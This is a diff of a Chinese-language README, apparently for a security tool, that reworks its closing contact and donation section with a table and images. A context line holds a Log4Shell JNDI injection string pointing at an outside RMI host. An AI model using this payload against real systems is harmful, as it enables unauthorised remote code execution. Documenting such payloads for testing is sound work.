@@ -336,6 +336,10 @@ ${jndi:rmi://1.1.1.1:1099/rmiqrq}
 
 师傅们可以加我wx，一起交流进步`RG9nZ3lDaGVuZwo=`
 
-给他买杯咖啡，让他接着码！
+| 给他买杯咖啡，让他接着码！ | 也可以加星球一起交流（免费） |
+| -------------------------- | -------------------------- |
 
-<img src="readme_resource/wx.jpg" alt="IMG_4788" width="300px" />
+<div align="center">
+<img src="readme_resource/wx.jpg" alt="IMG_4788" width="40%" />
+<img src="readme_resource/WechatIMG5383.jpg" alt="WechatIMG5383.jpg" width="45%" />
+</div>
